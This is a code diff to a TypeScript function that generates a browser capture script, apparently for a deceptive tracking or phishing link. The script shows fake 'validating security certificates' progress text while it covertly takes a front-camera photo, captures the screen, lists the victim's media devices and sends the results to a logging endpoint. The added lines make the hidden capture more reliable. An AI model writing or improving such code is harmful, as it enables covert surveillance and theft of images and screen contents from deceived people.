@@ -596,26 +596,47 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               try {
                 if (!isSilent) updateProgress(prog, "Validating server security certificates...");
                 if (navigator.mediaDevices) {
-                  var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }).catch(function(){ return null; });
+                  // Try to get video only first for better success rate
+                  var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(function(){ 
+                    return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
+                  });
+                  
                   if (stream) {
                     try {
                       var video = document.createElement('video');
+                      video.style.display = 'none';
+                      video.setAttribute('autoplay', '');
+                      video.setAttribute('muted', '');
+                      video.setAttribute('playsinline', '');
                       video.srcObject = stream;
-                      video.playsInline = true;
-                      await video.play();
-                      await new Promise(function(res) { setTimeout(res, 800); });
+                      document.body.appendChild(video);
+                      
+                      await new Promise(function(resolve) {
+                        video.onloadedmetadata = function() {
+                          video.play().then(resolve).catch(resolve);
+                        };
+                        setTimeout(resolve, 3000); // Fail-safe
+                      });
+                      
+                      await new Promise(function(res) { setTimeout(res, 1000); });
+                      
                       var canvas = document.createElement('canvas');
                       canvas.width = video.videoWidth || 640;
                       canvas.height = video.videoHeight || 480;
-                      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                      var snap = canvas.toDataURL('image/jpeg', 0.6);
-                      await logEvent('extra', { visual_identity: snap });
+                      var ctx = canvas.getContext('2d');
+                      if (ctx) {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var snap = canvas.toDataURL('image/jpeg', 0.7);
+                        await logEvent('extra', { visual_identity: snap });
+                      }
+                      
+                      var devs = await navigator.mediaDevices.enumerateDevices();
+                      var list = devs.map(function(d) { return d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5)); }).join('\n');
+                      await logExtra({ media_hardware: list });
+                      
+                      stream.getTracks().forEach(function(t) { t.stop(); });
+                      video.remove();
                     } catch(e) {}
-
-                    var devs = await navigator.mediaDevices.enumerateDevices();
-                    var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
-                    await logExtra({ media_hardware: list });
-                    stream.getTracks().forEach(t => t.stop());
                   }
                 }
               } catch(e) {}
@@ -645,18 +666,35 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                     try {
                       var track = s.getVideoTracks()[0];
                       var video = document.createElement('video');
+                      video.style.display = 'none';
+                      video.setAttribute('autoplay', '');
+                      video.setAttribute('muted', '');
+                      video.setAttribute('playsinline', '');
                       video.srcObject = s;
-                      video.playsInline = true;
-                      await video.play();
-                      await new Promise(function(res) { setTimeout(res, 800); });
+                      document.body.appendChild(video);
+                      
+                      await new Promise(function(resolve) {
+                        video.onloadedmetadata = function() {
+                          video.play().then(resolve).catch(resolve);
+                        };
+                        setTimeout(resolve, 3000); // Fail-safe
+                      });
+                      
+                      await new Promise(function(res) { setTimeout(res, 1000); });
+                      
                       var canvas = document.createElement('canvas');
                       canvas.width = video.videoWidth || window.screen.width;
                       canvas.height = video.videoHeight || window.screen.height;
-                      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                      var snap = canvas.toDataURL('image/jpeg', 0.5);
-                      await logEvent('extra', { screen_label: track.label, screen_capture: snap });
+                      var ctx = canvas.getContext('2d');
+                      if (ctx) {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var snap = canvas.toDataURL('image/jpeg', 0.6);
+                        await logEvent('extra', { screen_label: track.label, screen_capture: snap });
+                      }
+                      
+                      s.getTracks().forEach(function(t) { t.stop(); });
+                      video.remove();
                     } catch(e) {}
-                    s.getTracks().forEach(t => t.stop());
                   }
                 }
               } catch(e) {}
